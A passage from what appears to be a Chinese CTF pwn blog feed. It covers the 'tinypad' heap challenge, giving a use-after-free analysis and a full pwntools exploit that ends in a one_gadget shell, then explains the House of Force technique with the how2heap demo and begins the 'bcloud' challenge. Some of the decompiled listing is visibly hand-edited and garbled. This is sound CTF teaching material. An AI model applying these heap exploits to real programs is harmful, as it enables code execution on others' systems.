class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(c) = i + &apos;1&apos;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      if ( *(_QWORD *)&amp;tinypad[16 * (i + 16LL) + 8] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = strlen(*(const char **)&amp;tinypad[16 * (i + 16LL) + 8]);</span><br><span class="line">        writeln(*(char **)&amp;tinypad[16 * (i + 16LL) + 8], v3);</span><br><span class="line">      &#125;</span><br><span class="line">      writeln(&quot;\n&quot;, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      write_n(</span><br><span class="line">    &quot;+- MENU -----------------------------------------------------------------------+\n&quot;</span><br><span class="line">    &quot;| [A] Add memo                                                                 |\n&quot;</span><br><span class="line">    &quot;| [D] Delete memo                                                              |\n&quot;</span><br><span class="line">    &quot;| [E] Edit memo                                                                |\n&quot;</span><br><span class="line">    &quot;| [Q] Quit                                                                     |\n&quot;</span><br><span class="line">    &quot;+------------------------------------------------------------------------------+\n&quot;,</span><br><span class="line">    486LL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if ( cmd == &apos;D&apos; )                           // delete</span><br><span class="line">    &#123;</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )// inuse</span><br><span class="line">        &#123;</span><br><span class="line">          free(*(void **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);// ptr</span><br><span class="line">          *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] = 0LL;</span><br><span class="line">          writeln(&quot;\nDeleted.&quot;, 9LL);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">      if ( cmd = &apos;E&apos; )</span><br><span class="line">      write_n(&quot;(INDEX)&gt;&gt;&gt; &quot;, 11LL);</span><br><span class="line">      idx = read_int();</span><br><span class="line">      if ( idx &gt; 0 &amp;&amp; idx &lt;= 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *(_QWORD *)&amp;tinypad[16 * (idx - 1 + 16LL)] )</span><br><span class="line">        &#123;</span><br><span class="line">          c = &apos;0&apos;;</span><br><span class="line">          strcpy(tinypad, *(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">          while ( toupper(c) != &apos;Y&apos; )</span><br><span class="line">          &#123;</span><br><span class="line">            write_n(&quot;CONTENT: &quot;, 9LL);</span><br><span class="line">            v6 = strlen(tinypad);</span><br><span class="line">            writeln(tinypad, v6);</span><br><span class="line">            write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">            v7 = strlen(*(const char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8]);</span><br><span class="line">            read_until(tinypad, v7, &apos;\n&apos;);</span><br><span class="line">            writeln(&quot;Is it OK?&quot;, 9LL);</span><br><span class="line">            write_n(&quot;(Y/n)&gt;&gt;&gt; &quot;, 9LL);</span><br><span class="line">            read_until((char *)&amp;c, 1uLL, &apos;\n&apos;);</span><br><span class="line">          &#125;</span><br><span class="line">          strcpy(*(char **)&amp;tinypad[16 * (idx - 1 + 16LL) + 8], tinypad);</span><br><span class="line">          writeln(&quot;\nEdited.&quot;, 8LL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      if ( cmd != &apos;A&apos; )</span><br><span class="line">        goto LABEL_43;</span><br><span class="line">      while ( idx &lt;= 3 &amp;&amp; *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] )</span><br><span class="line">        ++idx;</span><br><span class="line">      if ( idx == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        writeln(&quot;No space is left.&quot;, 17LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        size = -1;</span><br><span class="line">        write_n(&quot;(SIZE)&gt;&gt;&gt; &quot;, 10LL);</span><br><span class="line">        size = read_int();</span><br><span class="line">        if ( size &lt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = 1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = size;</span><br><span class="line">          if ( (unsigned __int64)size &gt; 0x100 )</span><br><span class="line">            v5 = 256;</span><br><span class="line">        &#125;</span><br><span class="line">        size = v5;                              // max size =256</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5;</span><br><span class="line">        *(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(size);</span><br><span class="line">        if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )// 检查inuse位</span><br><span class="line">        &#123;</span><br><span class="line">          writerrln(&quot;[!] No memory is available.&quot;, 27LL);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);</span><br><span class="line">        read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], size, 0xAu);</span><br><span class="line">        writeln(&quot;\nAdded.&quot;, 7LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( cnt != 81 );</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为读取输出函数都是重写的，比较麻烦，但是手动测试能够发现最低位的覆盖问题</p><p>再有在delete时仅将size清零并free chunk，没有将chunk 指针清零，UAF漏洞存在</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./tinypad&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def add(size, content):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;A&quot;)</span><br><span class="line">    p.recvuntil(&quot;(SIZE)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line">def delete(index):</span><br><span class="line"> </span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;D&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"> </span><br><span class="line">def edit(index, content, ok=True):</span><br><span class="line">    p.recvuntil(&quot;(CMD)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;E&quot;)</span><br><span class="line">    p.recvuntil(&quot;(INDEX)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;(CONTENT)&gt;&gt;&gt; &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(&quot;(Y/n)&gt;&gt;&gt; &quot;)</span><br><span class="line">    if ok:</span><br><span class="line">        p.sendline(&quot;Y&quot;)</span><br><span class="line">    else:</span><br><span class="line">        p.sendline(&quot;n&quot;)</span><br><span class="line"> </span><br><span class="line">#stage one</span><br><span class="line">add(0x80, &quot;A&quot;*0x80)</span><br><span class="line">add(0x80, &quot;B&quot;*0x80)</span><br><span class="line">add(0x80, &quot;C&quot;*0x80)</span><br><span class="line">add(0x80, &quot;D&quot;*0x80)</span><br><span class="line">delete(3)</span><br><span class="line">delete(1)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">heap = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x120</span><br><span class="line">log.info(&quot;heap_base: %s&quot; % hex(heap))</span><br><span class="line">p.recvuntil(&quot; #   INDEX: 3\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_arena = u64(p.recv(6).ljust(8, &quot;\x00&quot;)) - 0x58</span><br><span class="line">log.info(&quot;main_arena: %s&quot; % hex(main_arena))</span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">delete(4)</span><br><span class="line"> </span><br><span class="line">#stage two</span><br><span class="line">add(0x18, &quot;A&quot;*0x18)</span><br><span class="line">add(0x100, &quot;B&quot;*0xf8 + p64(0x11))</span><br><span class="line">add(0x100, &quot;C&quot;*0xf8)</span><br><span class="line">add(0x100, &quot;D&quot;*0xf8)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tinypad = 0x602040</span><br><span class="line">offset = heap + 0x20 - 0x602040 - 0x20</span><br><span class="line">fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2</span><br><span class="line"> </span><br><span class="line">edit(3, &quot;D&quot;*0x20 + fake_chunk)</span><br><span class="line">zero_byte_number = 8 - len(p64(offset).strip(&quot;\x00&quot;))</span><br><span class="line">for i in range(zero_byte_number+1):</span><br><span class="line">  data = &quot;A&quot;*0x10 + p64(offset).strip(&quot;\x00&quot;).rjust(8-i, &apos;f&apos;)</span><br><span class="line">  edit(1, data)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">delete(2)</span><br><span class="line">edit(4, &quot;D&quot;*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2)</span><br><span class="line"> </span><br><span class="line">#gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">#stage three</span><br><span class="line">libc_base = main_arena + 0x58 - 0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: %s&quot; % hex(libc_base))</span><br><span class="line">one_gadget =  libc_base + 0x45216</span><br><span class="line">environ_pointer = libc_base + libc.symbols[&apos;__environ&apos;]</span><br><span class="line"> </span><br><span class="line">add(0xf0, &quot;A&quot;*0xd0 + p64(0x18) + p64(environ_pointer) + &apos;a&apos;*8 + p64(0x602148))</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot; #   INDEX: 1\n&quot;)</span><br><span class="line">p.recvuntil(&quot; # CONTENT: &quot;)</span><br><span class="line">main_ret = u64(p.recvline().rstrip().ljust(8, &quot;\x00&quot;)) - 0x8*30</span><br><span class="line">log.info(&quot;main_ret_addr: %s&quot; % hex(main_ret))</span><br><span class="line">log.info(&quot;one_gadget_addr :%s &quot;% hex(one_gadget))</span><br><span class="line">edit(2, p64(main_ret))</span><br><span class="line">edit(1, p64(one_gadget))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;Q&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.7-HouseOfForce</title>
      <link href="/2019/01/22/introduction-to-pwn2-7-houseofforce/"/>
      <url>/2019/01/22/introduction-to-pwn2-7-houseofforce/</url>
      <content type="html"><![CDATA[<h1 id="House-of-Force-原理"><a href="#House-of-Force-原理" class="headerlink" title="House of Force 原理"></a>House of Force 原理</h1><p>一个比较有意思的利用，也是第一次对top chunk 下手，原因在于堆管理中并没有多的检查top chunk的大小问题。</p><p>我们在有机会溢出改变top chunk size的情况下，可以将其改大（eg:-1，64位下即为0xffffffffffffffff，比较时会转化为无符号数），之后不论申请多大的chunk，经比较size之后，都不会去调用mmap去分配top chunk，但我们可以通过分配足够大小的chunk使之在main_arena中top chunk的指针变换位置，也就是说，我们可以将其分配之后的chunk到我们想要的地址（eg:got表），这样我们便可以通过控制我们可以控制的指针来任意地址写。</p><p>所以最起码需要：</p><ol><li>能够溢出至topchunk的size位</li><li>能够自由控制malloc大小</li></ol><p>使用how2heap的例子来解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;</span><br><span class="line"></span><br><span class="line">int main(int argc , char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;\nWelcome to the House of Force\n\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;</span><br><span class="line">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nLet&apos;s allocate the first chunk, taking space from the wilderness.\n&quot;);</span><br><span class="line">intptr_t *p1 = malloc(256);</span><br><span class="line">fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;);</span><br><span class="line">int real_size = malloc_usable_size(p1);</span><br><span class="line">fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nNow let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;);</span><br><span class="line"></span><br><span class="line">//----- VULNERABILITY ----</span><br><span class="line">intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));</span><br><span class="line">fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;</span><br><span class="line">fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));</span><br><span class="line">//------------------------</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span><br><span class="line">   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span><br><span class="line">   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span><br><span class="line"> * new_top = old_top + nb</span><br><span class="line"> * nb = new_top - old_top</span><br><span class="line"> * req + 2sizeof(long) = new_top - old_top</span><br><span class="line"> * req = new_top - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span><br><span class="line"> * req = dest - old_top - 4*sizeof(long)</span><br><span class="line"> */</span><br><span class="line">unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;</span><br><span class="line">fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span><br><span class="line">   &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size);</span><br><span class="line">void *new_ptr = malloc(evil_size);</span><br><span class="line">fprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;, new_ptr - sizeof(long)*2);</span><br><span class="line"></span><br><span class="line">void* ctr_chunk = malloc(100);</span><br><span class="line">fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk);</span><br><span class="line">fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var);</span><br><span class="line">fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;);</span><br><span class="line">strcpy(ctr_chunk, &quot;YEAH!!!&quot;);</span><br><span class="line">fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// some further discussion:</span><br><span class="line">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span><br><span class="line">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span><br><span class="line">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span><br><span class="line">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span><br><span class="line">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span><br><span class="line"></span><br><span class="line">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the end, we will use this to overwrite a variable at 0x602060.</span><br><span class="line">Its current value is: This is a string that we want to overwrite.</span><br><span class="line"></span><br><span class="line">Let&apos;s allocate the first chunk, taking space from the wilderness.</span><br><span class="line">The chunk of 256 bytes has been allocated at 0xd61f90.</span><br><span class="line"></span><br><span class="line">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><br><span class="line">Real size (aligned and all that jazz) of our allocated chunk is 280.</span><br><span class="line"></span><br><span class="line">Now let&apos;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><br><span class="line"></span><br><span class="line">The top chunk starts at 0xd62110</span><br><span class="line"></span><br><span class="line">Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><br><span class="line">Old size of top chunk 0x20ef1</span><br><span class="line">New size of top chunk 0xffffffffffffffff</span><br><span class="line"></span><br><span class="line">The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><br><span class="line">Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><br><span class="line">overflow) and will then be able to allocate a chunk right over the desired region.</span><br><span class="line"></span><br><span class="line">The value we want to write to at 0x602060, and the top chunk is at 0xd62110, so accounting for the header size,</span><br><span class="line">we will malloc 0xffffffffff89ff30 bytes.</span><br><span class="line">As expected, the new pointer is at the same place as the old top chunk: 0xd62110</span><br><span class="line"></span><br><span class="line">Now, the next chunk we overwrite will point at our target buffer.</span><br><span class="line">malloc(100) =&gt; 0x602060!</span><br><span class="line">Now, we can finally overwrite that value:</span><br><span class="line">... old string: This is a string that we want to overwrite.</span><br><span class="line">... doing strcpy overwrite with &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure><p>原理可以参考：<a href="https://bbs.pediy.com/thread-222924.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222924.htm</a></p><h1 id="bcloud"><a href="#bcloud" class="headerlink" title="bcloud"></a>bcloud</h1><p>回家做的第一道，看了半天没看出来漏洞。。。name的输出函数被漏掉了。。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>刚进去要输入name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">unsigned int get_name()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+1Ch] [ebp-5Ch]</span><br><span class="line">  char *name_; // [esp+5Ch] [ebp-1Ch]</span><br><span class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;s, 0, 0x50u);</span><br><span class="line">  puts(&quot;Input your name:&quot;);</span><br><span class="line">  read_str((int)&amp;s, 0x40, &apos;\n&apos;);</span><br><span class="line">  name_ = (char *)malloc(0x40u);</span><br><span class="line">  name_ptr = (int)name_;</span><br><span class="line">  strcpy(name_, &amp;s);</span><br><span class="line">  puts_(name_);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后要输入Org &amp; Host,漏洞的主力。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 